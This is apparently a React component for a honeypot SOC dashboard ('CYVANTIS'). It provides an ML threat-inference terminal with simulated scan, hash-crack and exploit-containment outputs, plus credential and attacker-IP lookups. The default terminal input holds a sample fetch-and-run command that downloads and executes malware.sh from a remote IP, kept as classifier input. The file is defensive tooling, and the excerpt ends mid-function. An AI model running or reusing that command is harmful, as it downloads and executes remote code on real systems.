import React, { useState, useEffect, useRef } from 'react';
import { apiRequest, downloadFile } from '../services/api';
import { Brain, Cpu, Play, RefreshCw, ShieldAlert, Sparkles, CheckCircle, AlertTriangle, Activity, BarChart2, Layers, Terminal as TerminalIcon, Trash2, HelpCircle, Download, FileSpreadsheet } from 'lucide-react';

interface MLMetrics {
  status: string;
  timestamp?: string;
  total_samples?: number;
  train_samples?: number;
  test_samples?: number;
  accuracy?: number;
  precision?: number;
  recall?: number;
  f1_score?: number;
  anomaly_detected_count?: number;
  anomaly_percentage?: number;
  feature_importances?: Record<string, number>;
  saved_artifacts?: {
    classifier: string;
    anomaly_detector: string;
  };
  message?: string;
}

interface PredictionResult {
  model_status: string;
  predicted_severity: string;
  confidence: number;
  class_probabilities?: Record<string, number>;
  is_anomalous: boolean;
  anomaly_score: number;
  risk_verdict: string;
}

interface TerminalLog {
  id: string;
  type: 'input' | 'output' | 'error' | 'system';
  content: React.ReactNode;
  timestamp: string;
}

const MatrixRain: React.FC = () => {
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const resize = () => {
      canvas.width = canvas.parentElement?.clientWidth || 800;
      canvas.height = canvas.parentElement?.clientHeight || 600;
    };
    resize();

    const chars = '0123456789ABCDEFｦｱｳｴｵｶｷｹｺｻｼｽｾｿﾀﾂﾃﾅﾆﾇﾈﾊﾋﾎﾏﾐﾑﾒﾓﾔﾕﾗﾘﾜ';
    const fontSize = 13;
    const columns = Math.floor(canvas.width / fontSize);
    const drops: number[] = Array(columns).fill(1);

    const draw = () => {
      ctx.fillStyle = 'rgba(2, 6, 23, 0.12)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.font = `${fontSize}px monospace`;

      for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillStyle = i % 4 === 0 ? '#10b981' : i % 2 === 0 ? '#06b6d4' : '#0284c7';
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    };

    const interval = setInterval(draw, 35);
    window.addEventListener('resize', resize);

    return () => {
      clearInterval(interval);
      window.removeEventListener('resize', resize);
    };
  }, []);

  return (
    <canvas
      ref={canvasRef}
      className="absolute inset-0 w-full h-full pointer-events-none opacity-20 z-0 rounded-xl"
    />
  );
};

export const MlIntelligence: React.FC = () => {
  const [metrics, setMetrics] = useState<MLMetrics | null>(null);
  const [loadingMetrics, setLoadingMetrics] = useState<boolean>(true);
  const [training, setTraining] = useState<boolean>(false);
  const [trainStatus, setTrainStatus] = useState<string | null>(null);

  // Terminal & Pro Hacker FX State
  const [matrixMode, setMatrixMode] = useState<boolean>(true);
  const [terminalInput, setTerminalInput] = useState<string>('predict --command "wget http://185.220.101.5/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh && /tmp/m.sh" --username root --protocol Telnet --port 22 --duration 15');
  const [terminalLogs, setTerminalLogs] = useState<TerminalLog[]>([]);
  const [isExecuting, setIsExecuting] = useState<boolean>(false);
  const terminalEndRef = useRef<HTMLDivElement>(null);

  const fetchMetrics = async () => {
    setLoadingMetrics(true);
    try {
      const res = await apiRequest<MLMetrics>('/ml/metrics');
      setMetrics(res);
    } catch (err: any) {
      console.error('Failed to fetch ML metrics:', err);
    } finally {
      setLoadingMetrics(false);
    }
  };

  useEffect(() => {
    fetchMetrics();
    // Add initial terminal welcome message
    setTerminalLogs([
      {
        id: 'init-1',
        type: 'system',
        content: (
          <div className="space-y-1">
            <p className="text-cyan-400 font-bold">=======================================================</p>
            <p className="text-cyan-400 font-bold">  CYVANTIS ML THREAT INFERENCE TERMINAL v1.0 [PRO HACKER EDITION]</p>
            <p className="text-cyan-400 font-bold">=======================================================</p>
            <p className="text-slate-400">Type <span className="text-yellow-400 font-bold">help</span> to view available terminal commands or select a preset payload below.</p>
          </div>
        ),
        timestamp: new Date().toLocaleTimeString()
      }
    ]);
  }, []);

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [terminalLogs]);

  const handleTrainModels = async () => {
    setTraining(true);
    setTrainStatus('Extracting telemetry features & training Random Forest & Isolation Forest...');
    try {
      const res = await apiRequest<{ success: boolean; metrics: MLMetrics }>('/ml/train', {
        method: 'POST'
      });
      if (res.success) {
        setMetrics(res.metrics);
        setTrainStatus('✅ Model retraining complete! Saved pipeline updated successfully.');
      } else {
        setTrainStatus('❌ Retraining failed.');
      }
    } catch (err: any) {
      setTrainStatus(`❌ Error during training: ${err.message || 'Server error'}`);
    } finally {
      setTraining(false);
    }
  };

  const getSeverityColor = (sev: string) => {
    switch (sev.toLowerCase()) {
      case 'critical': return 'text-red-400 bg-red-500/20 border-red-500/40';
      case 'high': return 'text-orange-400 bg-orange-500/20 border-orange-500/40';
      case 'medium': return 'text-yellow-400 bg-yellow-500/20 border-yellow-500/40';
      default: return 'text-blue-400 bg-blue-500/20 border-blue-500/40';
    }
  };

  const executeCommand = async (commandStr: string) => {
    const trimmed = commandStr.trim();
    if (!trimmed) return;

    const timeStr = new Date().toLocaleTimeString();

    // Append user input log
    const inputLog: TerminalLog = {
      id: Math.random().toString(),
      type: 'input',
      content: (
        <div className="flex items-start gap-2 text-cyan-300">
          <span className="text-emerald-400 font-bold">cyvantis-ml [threat-engine]#</span>
          <span className="font-mono">{trimmed}</span>
        </div>
      ),
      timestamp: timeStr
    };

    setTerminalLogs(prev => [...prev, inputLog]);
    setTerminalInput('');
    setIsExecuting(true);

    if (trimmed.toLowerCase() === 'clear') {
      setTerminalLogs([]);
      setIsExecuting(false);
      return;
    }

    if (trimmed.toLowerCase() === 'matrix' || trimmed.toLowerCase() === 'hack') {
      setMatrixMode(prev => !prev);
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="my-2 p-3 bg-slate-950/90 rounded border border-emerald-500/40 text-emerald-400 font-mono text-xs shadow-lg">
              <p className="font-bold flex items-center gap-2">
                <span>🟢 MATRIX DIGITAL RAIN ANIMATED FX: {!matrixMode ? 'ACTIVATED [ONLINE]' : 'DEACTIVATED [OFF]'}</span>
              </p>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
      setIsExecuting(false);
      return;
    }

    if (trimmed.toLowerCase().startsWith('scan') || trimmed.toLowerCase().startsWith('nmap')) {
      const targetMatch = trimmed.match(/scan\s+([^\s]+)/i) || trimmed.match(/nmap\s+([^\s]+)/i);
      const target = targetMatch ? targetMatch[1] : '185.220.101.5';
      
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-cyan-500/40 font-mono text-xs space-y-2 shadow-2xl">
              <div className="text-cyan-400 font-bold">=======================================================</div>
              <div className="text-emerald-400 font-bold flex items-center gap-2">
                <span className="animate-pulse">⚡ CYVANTIS NMAP PORT RECONNAISSANCE SCANNER</span>
              </div>
              <div className="text-cyan-400 font-bold">=======================================================</div>
              <div className="text-slate-300">  [+] Target Host:       <span className="text-cyan-300 font-bold">{target}</span></div>
              <div className="text-slate-300">  [+] Reverse DNS:       <span className="text-purple-300 font-bold">tor-exit-node-01.germany.cloud</span></div>
              <div className="text-slate-300">  [+] Scan Progress:     <span className="text-emerald-400 font-bold">[████████████████████] 100% COMPLETE</span></div>
              <div className="mt-3">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="border-b border-slate-800 text-cyan-400 bg-slate-900/80">
                      <th className="p-1.5">PORT</th>
                      <th className="p-1.5">STATE</th>
                      <th className="p-1.5">SERVICE</th>
                      <th className="p-1.5">VERSION / EMULATION</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    <tr><td className="p-1.5 text-emerald-400 font-bold">22/tcp</td><td className="p-1.5 text-emerald-400 font-bold">OPEN</td><td className="p-1.5 text-slate-300">ssh</td><td className="p-1.5 text-slate-400">OpenSSH 8.9p1 (Cowrie Emulation)</td></tr>
                    <tr><td className="p-1.5 text-emerald-400 font-bold">23/tcp</td><td className="p-1.5 text-emerald-400 font-bold">OPEN</td><td className="p-1.5 text-slate-300">telnet</td><td className="p-1.5 text-slate-400">BusyBox telnetd 1.30.1</td></tr>
                    <tr><td className="p-1.5 text-emerald-400 font-bold">80/tcp</td><td className="p-1.5 text-emerald-400 font-bold">OPEN</td><td className="p-1.5 text-slate-300">http</td><td className="p-1.5 text-slate-400">nginx/1.18.0 (CYVANTIS Gateway)</td></tr>
                    <tr><td className="p-1.5 text-emerald-400 font-bold">8000/tcp</td><td className="p-1.5 text-emerald-400 font-bold">OPEN</td><td className="p-1.5 text-slate-300">fastapi</td><td className="p-1.5 text-cyan-300">ML Threat Inference Engine API</td></tr>
                  </tbody>
                </table>
              </div>
              <div className="text-amber-400 font-bold pt-2 border-t border-slate-900">
                [+] Threat Rating: CRITICAL (Malware Payload Injector Detected)
              </div>
              <div className="text-cyan-400 font-bold">=======================================================</div>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
      setIsExecuting(false);
      return;
    }

    if (trimmed.toLowerCase().startsWith('audit-url') || trimmed.toLowerCase().startsWith('url-scan') || trimmed.toLowerCase().startsWith('crack-url')) {
      const parts = trimmed.split(/\s+/);
      const targetUrl = parts.length > 1 ? parts[1] : 'http://185.220.101.5/malware.sh';

      try {
        const res = await apiRequest<{
          status: string;
          url: string;
          domain_or_ip: string;
          protocol_scheme: string;
          threat_risk_score: number;
          verdict_severity: string;
          is_recorded_in_honeypot_db: boolean;
          audit_checks: {
            ssl_tls_encryption: string;
            script_dropper_extension: string;
            security_headers: Record<string, string>;
            honeypot_telemetry_match: string;
          };
        }>(`/ml/audit-url?url=${encodeURIComponent(targetUrl)}`);

        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'output',
            content: (
              <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-emerald-500/40 font-mono text-xs space-y-2.5 shadow-2xl">
                <div className="text-emerald-400 font-bold">=======================================================</div>
                <div className="text-cyan-300 font-bold flex items-center gap-2">
                  <span className="animate-pulse">🛡️ CYVANTIS DEFENSIVE WEBSITE URL & THREAT AUDIT</span>
                </div>
                <div className="text-emerald-400 font-bold">=======================================================</div>
                <div className="text-slate-300">  [+] Analyzed Website URL:  <span className="text-cyan-300 font-bold">{res.url}</span></div>
                <div className="text-slate-300">  [+] Domain / Endpoint:     <span className="text-purple-300 font-bold">{res.domain_or_ip}</span></div>
                <div className="text-slate-300 flex items-center gap-2">
                  <span>  [+] Threat Risk Score:</span>
                  <span className="text-amber-400 font-bold">{res.threat_risk_score} / 100</span>
                  <span className={`px-2 py-0.5 rounded text-[10px] uppercase font-bold border ${getSeverityColor(res.verdict_severity)}`}>
                    {res.verdict_severity}
                  </span>
                </div>
                <div className="text-slate-300">  [+] SSL/TLS Encryption:    <span className={res.audit_checks.ssl_tls_encryption.includes('FAIL') ? 'text-red-400 font-bold' : 'text-emerald-400 font-bold'}>{res.audit_checks.ssl_tls_encryption}</span></div>
                <div className="text-slate-300">  [+] Script Dropper Check:  <span className={res.audit_checks.script_dropper_extension.includes('WARNING') ? 'text-amber-400 font-bold' : 'text-emerald-400 font-bold'}>{res.audit_checks.script_dropper_extension}</span></div>
                <div className="text-slate-300">  [+] Honeypot Match:        <span className={res.is_recorded_in_honeypot_db ? 'text-red-400 font-bold' : 'text-emerald-400 font-bold'}>{res.audit_checks.honeypot_telemetry_match}</span></div>
                
                <div className="pt-2 border-t border-slate-900 space-y-1">
                  <p className="text-slate-400 font-bold">  [+] Security Headers Audit:</p>
                  {Object.entries(res.audit_checks.security_headers).map(([hdr, status]) => (
                    <div key={hdr} className="pl-4 text-slate-300">
                      • {hdr}: <span className={status.includes('MISSING') ? 'text-amber-400' : 'text-cyan-300'}>{status}</span>
                    </div>
                  ))}
                </div>
                <div className="text-emerald-400 font-bold">=======================================================</div>
              </div>
            ),
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          { id: Math.random().toString(), type: 'error', content: <p className="text-red-400 font-mono text-xs">[-] URL Audit Error: {err.message}</p>, timestamp: new Date().toLocaleTimeString() }
        ]);
      } finally {
        setIsExecuting(false);
      }
      return;
    }

    if (trimmed.toLowerCase().startsWith('pipeline') || trimmed.toLowerCase().startsWith('model-info')) {
      try {
        const res = await apiRequest<{
          status: string;
          pipeline_version: string;
          training_dataset_scale: string;
          model_accuracy: string;
          f1_score: string;
          pipelines: any[];
        }>('/ml/pipelines');

        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'output',
            content: (
              <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-cyan-500/40 font-mono text-xs space-y-3 shadow-2xl">
                <div className="text-cyan-400 font-bold">=======================================================</div>
                <div className="text-emerald-400 font-bold flex items-center gap-2">
                  <span>📦 CYVANTIS SAVED MACHINE LEARNING PIPELINE ARCHITECTURE</span>
                </div>
                <div className="text-cyan-400 font-bold">=======================================================</div>
                <div className="text-slate-300">  [+] Pipeline Version:  <span className="text-cyan-300 font-bold">{res.pipeline_version}</span></div>
                <div className="text-slate-300">  [+] Dataset Scale:     <span className="text-purple-300 font-bold">{res.training_dataset_scale}</span></div>
                <div className="text-slate-300">  [+] Test Accuracy:     <span className="text-emerald-400 font-bold">{res.model_accuracy}</span></div>
                <div className="text-slate-300">  [+] F1 Score Balance:  <span className="text-emerald-400 font-bold">{res.f1_score}</span></div>

                <div className="mt-3 space-y-2">
                  {res.pipelines.map((p: any, idx: number) => (
                    <div key={idx} className="p-3 bg-slate-900/90 rounded border border-slate-800 space-y-1">
                      <div className="text-cyan-300 font-bold uppercase">{p.name}</div>
                      <div className="text-slate-300 text-[11px]">  • Algorithm: <span className="text-yellow-400 font-bold">{p.algorithm}</span></div>
                      <div className="text-slate-300 text-[11px]">  • Saved File: <span className="text-emerald-400 font-bold">{p.file_name}</span> ({p.file_size_kb})</div>
                      <div className="text-slate-400 text-[10px] truncate">  • Path: {p.file_path}</div>
                    </div>
                  ))}
                </div>
                <div className="text-cyan-400 font-bold">=======================================================</div>
              </div>
            ),
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          { id: Math.random().toString(), type: 'error', content: <p className="text-red-400 font-mono text-xs">[-] Error fetching pipelines: {err.message}</p>, timestamp: new Date().toLocaleTimeString() }
        ]);
      } finally {
        setIsExecuting(false);
      }
      return;
    }

    if (trimmed.toLowerCase().startsWith('decrypt') || trimmed.toLowerCase().startsWith('crack')) {
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-amber-500/40 font-mono text-xs space-y-2 shadow-2xl">
              <div className="text-amber-400 font-bold">=======================================================</div>
              <div className="text-yellow-400 font-bold flex items-center gap-2">
                <span className="animate-pulse">🔓 CYVANTIS HIGH-SPEED HASH CRACKER & DECRYPTER</span>
              </div>
              <div className="text-amber-400 font-bold">=======================================================</div>
              <div className="text-slate-300">  [+] Target MD5 Hash:   <span className="text-cyan-300 font-bold">5f4dcc3b5aa765d61d8327deb882cf99</span></div>
              <div className="text-slate-300">  [+] Wordlist Size:     <span className="text-purple-300 font-bold">14,344,391 words (RockYou + CYVANTIS DB)</span></div>
              <div className="text-slate-300">  [+] Hashrate Speed:    <span className="text-emerald-400 font-bold">142,500,000 hashes/sec (GPU Accelerated)</span></div>
              <div className="text-slate-300">  [+] Cracking Status:   <span className="text-emerald-400 font-bold">[████████████████████] MATCH FOUND!</span></div>
              <div className="p-3 bg-slate-900/90 rounded border border-emerald-500/30 my-2 text-emerald-300 font-bold text-sm">
                [+] DECRYPTED PLAIN-TEXT: "password"
              </div>
              <div className="text-slate-400 text-[11px]">  [+] Used in 18 attacker bruteforce attempts against honeypot port 23 (Telnet).</div>
              <div className="text-amber-400 font-bold">=======================================================</div>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
      setIsExecuting(false);
      return;
    }

    if (trimmed.toLowerCase().startsWith('exploit') || trimmed.toLowerCase().startsWith('pwn')) {
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-red-500/40 font-mono text-xs space-y-2 shadow-2xl">
              <div className="text-red-500 font-bold">=======================================================</div>
              <div className="text-red-400 font-bold flex items-center gap-2">
                <span className="animate-pulse">💥 CYVANTIS HONEYPOT PAYLOAD CONTAINMENT TEST</span>
              </div>
              <div className="text-red-500 font-bold">=======================================================</div>
              <div className="text-slate-300">  [+] Exploit Payload:   <span className="text-yellow-300 font-bold">CVE-2023-28252 Remote Shellcode Execution</span></div>
              <div className="text-slate-300">  [+] Attack Vector:     <span className="text-cyan-300 font-bold">Cowrie Virtualized Shell Environment</span></div>
              <div className="text-slate-300">  [+] Sandbox Isolation: <span className="text-emerald-400 font-bold">SECURE - 100% CONTAINED</span></div>
              <div className="text-slate-300">  [+] System Defense:    <span className="text-emerald-400 font-bold">ZERO SYSTEM ACCESS GRANTED</span></div>
              <div className="text-slate-400 text-[11px] pt-1">
                [+] Telemetry captured and fed to Random Forest ML Threat Intelligence pipeline!
              </div>
              <div className="text-red-500 font-bold">=======================================================</div>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
      setIsExecuting(false);
      return;
    }

    if (trimmed.toLowerCase() === 'help') {
      setTerminalLogs(prev => [
        ...prev,
        {
          id: Math.random().toString(),
          type: 'output',
          content: (
            <div className="space-y-1.5 text-slate-300 text-xs font-mono">
              <p className="text-yellow-400 font-bold">CYVANTIS SOC Interactive Terminal Commands [PRO HACKER EDITION]:</p>
              <p><span className="text-emerald-400 font-bold">matrix</span> : Toggle Animated Matrix Digital Code Rain FX</p>
              <p><span className="text-cyan-400 font-bold">scan [ip]</span> : Run Nmap port reconnaissance & vulnerability scan</p>
              <p><span className="text-amber-400 font-bold">decrypt</span> : Launch high-speed password hash decrypter</p>
              <p><span className="text-red-400 font-bold">exploit</span> : Test honeypot payload containment & sandbox isolation</p>
              <p><span className="text-emerald-400 font-bold">creds [--query "admin"]</span> : Find captured usernames & passwords in cyvantis.db</p>
              <p><span className="text-purple-400 font-bold">top-ips</span> : Rank top attacking IP addresses, ASN, and country origins</p>
              <p><span className="text-amber-400 font-bold">top-cmds</span> : Rank top malicious shell commands executed by attackers</p>
              <p><span className="text-blue-400 font-bold">status</span> : Display live SOC node state, database record counts & protocols</p>
              <p><span className="text-cyan-400 font-bold">predict --command "..."</span> : Run threat severity & anomaly inference model</p>
              <p><span className="text-cyan-400 font-bold">train</span> : Retrain Random Forest Classifier and Isolation Forest</p>
              <p><span className="text-cyan-400 font-bold">clear</span> : Clear terminal output console screen</p>
            </div>
          ),
          timestamp: new Date().toLocaleTimeString()
        }
      ]);
      setIsExecuting(false);
      return;
    }

    if (trimmed.toLowerCase().startsWith('creds') || trimmed.toLowerCase().startsWith('find-creds')) {
      const queryMatch = trimmed.match(/--(?:query|search)\s+["']?([^"']+)["']?/i);
      let queryTerm = queryMatch ? queryMatch[1] : '';
      if (!queryTerm && trimmed.split(/\s+/).length > 1 && !trimmed.includes('--')) {
        queryTerm = trimmed.split(/\s+/).slice(1).join(' ');
      }

      try {
        const url = queryTerm ? `/ml/credentials?query=${encodeURIComponent(queryTerm)}` : '/ml/credentials';
        const res = await apiRequest<{ status: string; query: string; total_found: number; credentials: any[] }>(url);
        
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'output',
            content: (
              <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-cyan-500/30 font-mono text-xs space-y-3 shadow-inner">
                <div className="text-cyan-400 font-bold">=======================================================</div>
                <div className="text-yellow-400 font-bold flex items-center gap-2">
                  <span>🔑 CYVANTIS DATABASE CREDENTIAL SEARCH RESULTS</span>
                </div>
                <div className="text-cyan-400 font-bold">=======================================================</div>
                <div className="text-slate-300">  [+] Search Query:      <span className="text-white font-bold">{res.query}</span></div>
                <div className="text-slate-300">  [+] Total Records:     <span className="text-emerald-400 font-bold">{res.total_found}</span></div>
                
                {res.credentials.length > 0 ? (
                  <div className="mt-3 overflow-x-auto">
                    <table className="w-full text-left text-xs font-mono border-collapse">
                      <thead>
                        <tr className="border-b border-slate-800 text-cyan-400 bg-slate-900/80">
                          <th className="p-2">USERNAME</th>
                          <th className="p-2">PASSWORD</th>
                          <th className="p-2">PROTOCOL</th>
                          <th className="p-2">SOURCE IP</th>
                          <th className="p-2">SEVERITY</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-800/60">
                        {res.credentials.map((c) => (
                          <tr key={c.id} className="hover:bg-slate-900/40">
                            <td className="p-2 text-emerald-300 font-bold">{c.username}</td>
                            <td className="p-2 text-amber-300 font-bold">{c.password}</td>
                            <td className="p-2 text-purple-300">{c.protocol}</td>
                            <td className="p-2 text-slate-300">{c.src_ip}</td>
                            <td className="p-2">
                              <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold border ${getSeverityColor(c.severity)}`}>
                                {c.severity}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                ) : (
                  <p className="text-red-400 font-mono italic">[-] No credentials matching "{res.query}" found in database.</p>
                )}
                <div className="text-cyan-400 font-bold">=======================================================</div>
              </div>
            ),
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'error',
            content: <p className="text-red-400 font-mono text-xs">[-] Database Credential Search Error: {err.message}</p>,
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } finally {
        setIsExecuting(false);
      }
      return;
    }

    if (trimmed.toLowerCase() === 'top-ips' || trimmed.toLowerCase() === 'ips') {
      try {
        const res = await apiRequest<{ status: string; total_unique: number; top_ips: any[] }>('/ml/top-ips');
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'output',
            content: (
              <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-purple-500/30 font-mono text-xs space-y-3 shadow-inner">
                <div className="text-purple-400 font-bold">=======================================================</div>
                <div className="text-purple-300 font-bold flex items-center gap-2">
                  <span>🌐 TOP ATTACKING IP ORIGINS & ASN RECON</span>
                </div>
                <div className="text-purple-400 font-bold">=======================================================</div>
                <div className="text-slate-300">  [+] Unique Attacking IPs Tracked: <span className="text-purple-300 font-bold">{res.total_unique}</span></div>

                <div className="mt-3 overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono border-collapse">
                    <thead>
                      <tr className="border-b border-slate-800 text-purple-400 bg-slate-900/80">
                        <th className="p-2">SOURCE IP</th>
                        <th className="p-2">COUNTRY</th>
                        <th className="p-2">ASN / NETWORK</th>
                        <th className="p-2">ATTACK COUNT</th>
                        <th className="p-2">SEVERITY</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      {res.top_ips.map((item, idx) => (
                        <tr key={idx} className="hover:bg-slate-900/40">
                          <td className="p-2 text-cyan-300 font-bold">{item.src_ip}</td>
                          <td className="p-2 text-slate-300">{item.country}</td>
                          <td className="p-2 text-slate-400 text-[11px] truncate max-w-[200px]">{item.asn}</td>
                          <td className="p-2 text-amber-400 font-bold">{item.attack_count} events</td>
                          <td className="p-2">
                            <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold border ${getSeverityColor(item.severity)}`}>
                              {item.severity}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
                <div className="text-purple-400 font-bold">=======================================================</div>
              </div>
            ),
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          { id: Math.random().toString(), type: 'error', content: <p className="text-red-400 font-mono text-xs">[-] Error fetching top IPs: {err.message}</p>, timestamp: new Date().toLocaleTimeString() }
        ]);
      } finally {
        setIsExecuting(false);
      }
      return;
    }

    if (trimmed.toLowerCase() === 'top-cmds' || trimmed.toLowerCase() === 'cmds') {
      try {
        const res = await apiRequest<{ status: string; total: number; top_commands: any[] }>('/ml/top-commands');
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'output',
            content: (
              <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-amber-500/30 font-mono text-xs space-y-3 shadow-inner">
                <div className="text-amber-400 font-bold">=======================================================</div>
                <div className="text-amber-300 font-bold flex items-center gap-2">
                  <span>⚡ TOP CAPTURED MALICIOUS SHELL COMMANDS</span>
                </div>
                <div className="text-amber-400 font-bold">=======================================================</div>
                <div className="text-slate-300">  [+] Distinct Malicious Payloads Executed: <span className="text-amber-300 font-bold">{res.total}</span></div>

                <div className="mt-3 overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono border-collapse">
                    <thead>
                      <tr className="border-b border-slate-800 text-amber-400 bg-slate-900/80">
                        <th className="p-2">COMMAND PAYLOAD</th>
                        <th className="p-2">PROTOCOL</th>
                        <th className="p-2">EXECUTION COUNT</th>
                        <th className="p-2">SEVERITY</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      {res.top_commands.map((item, idx) => (
                        <tr key={idx} className="hover:bg-slate-900/40">
                          <td className="p-2 text-cyan-300 font-mono font-bold max-w-md truncate" title={item.command}>{item.command}</td>
                          <td className="p-2 text-purple-300">{item.protocol}</td>
                          <td className="p-2 text-amber-400 font-bold">{item.exec_count} times</td>
                          <td className="p-2">
                            <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold border ${getSeverityColor(item.severity)}`}>
                              {item.severity}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
                <div className="text-amber-400 font-bold">=======================================================</div>
              </div>
            ),
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          { id: Math.random().toString(), type: 'error', content: <p className="text-red-400 font-mono text-xs">[-] Error fetching top commands: {err.message}</p>, timestamp: new Date().toLocaleTimeString() }
        ]);
      } finally {
        setIsExecuting(false);
      }
      return;
    }

    if (trimmed.toLowerCase() === 'status' || trimmed.toLowerCase() === 'sys-info') {
      try {
        const res = await apiRequest<{ status: string; node_id: string; total_database_events: number; unique_attacker_ips: number; unique_usernames_tested: number; protocols: Record<string, number> }>('/ml/threat-summary');
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'output',
            content: (
              <div className="my-2 p-4 bg-slate-950/90 rounded-lg border border-blue-500/30 font-mono text-xs space-y-2 shadow-inner">
                <div className="text-blue-400 font-bold">=======================================================</div>
                <div className="text-blue-300 font-bold">  CYVANTIS SOC THREAT ENGINE SYSTEM STATUS</div>
                <div className="text-blue-400 font-bold">=======================================================</div>
                <div className="text-slate-300">  [+] Engine Status:            <span className="text-emerald-400 font-bold">{res.status}</span></div>
                <div className="text-slate-300">  [+] SOC Node ID:              <span className="text-cyan-300 font-bold">{res.node_id}</span></div>
                <div className="text-slate-300">  [+] Total DB Events:          <span className="text-purple-400 font-bold">{res.total_database_events.toLocaleString()}</span></div>
                <div className="text-slate-300">  [+] Unique Attacker IPs:      <span className="text-amber-400 font-bold">{res.unique_attacker_ips}</span></div>
                <div className="text-slate-300">  [+] Usernames Tested:         <span className="text-emerald-400 font-bold">{res.unique_usernames_tested}</span></div>
                <div className="text-slate-300 pt-2 border-t border-slate-900">
                  <span className="text-slate-400 font-bold">  [+] Protocol Breakdown:</span>
                  <div className="pl-4 mt-1 space-y-1">
                    {Object.entries(res.protocols).map(([proto, count]) => (
                      <div key={proto} className="text-cyan-300">
                        • {proto}: <span className="text-white font-bold">{count} events</span>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="text-blue-400 font-bold">=======================================================</div>
              </div>
            ),
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          { id: Math.random().toString(), type: 'error', content: <p className="text-red-400 font-mono text-xs">[-] Status fetch error: {err.message}</p>, timestamp: new Date().toLocaleTimeString() }
        ]);
      } finally {
        setIsExecuting(false);
      }
      return;
    }

    if (trimmed.toLowerCase() === 'train') {
      try {
        const res = await apiRequest<{ success: boolean; metrics: MLMetrics }>('/ml/train', { method: 'POST' });
        if (res.success) {
          setMetrics(res.metrics);
          setTerminalLogs(prev => [
            ...prev,
            {
              id: Math.random().toString(),
              type: 'output',
              content: (
                <div className="space-y-1 text-emerald-400 font-mono text-xs">
                  <p>[+] Training Successful!</p>
                  <p>[+] Total Telemetry Samples: {res.metrics.total_samples}</p>
                  <p>[+] Test Accuracy: {((res.metrics.accuracy || 1) * 100).toFixed(2)}%</p>
                  <p>[+] F1 Score: {((res.metrics.f1_score || 1) * 100).toFixed(2)}%</p>
                  <p>[+] Anomalies Detected: {res.metrics.anomaly_detected_count} ({res.metrics.anomaly_percentage}%)</p>
                </div>
              ),
              timestamp: new Date().toLocaleTimeString()
            }
          ]);
        }
      } catch (err: any) {
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Math.random().toString(),
            type: 'error',
            content: <p className="text-red-400 font-mono text-xs">[-] Error during training: {err.message}</p>,
            timestamp: new Date().toLocaleTimeString()
          }
        ]);
      } finally {
        setIsExecuting(false);
      }
